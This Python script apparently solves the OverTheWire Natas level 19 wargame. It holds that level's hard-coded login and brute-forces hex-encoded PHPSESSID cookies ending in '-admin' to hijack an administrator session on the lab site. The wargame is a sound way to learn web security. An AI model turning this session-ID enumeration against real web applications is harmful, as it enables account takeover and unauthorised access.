import requests
import string
from requests.auth import HTTPBasicAuth

basicAuth=HTTPBasicAuth('natas19', 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')

MAX = 640
count = 1

url = "http://natas19.natas.labs.overthewire.org"

while count <= MAX:
    numberAsHex = "".join("{:02x}".format(ord(c)) for c in str(count))
    sessionID = "PHPSESSID=" + numberAsHex + "2d61646d696e"
    print(sessionID)

    headers = {'Cookie': sessionID}
    response = requests.get(url, headers=headers, auth=basicAuth, verify=False)

    if "You are logged in as a regular user" not in response.text:
        print(response.text)

    count += 1

print("Done!")
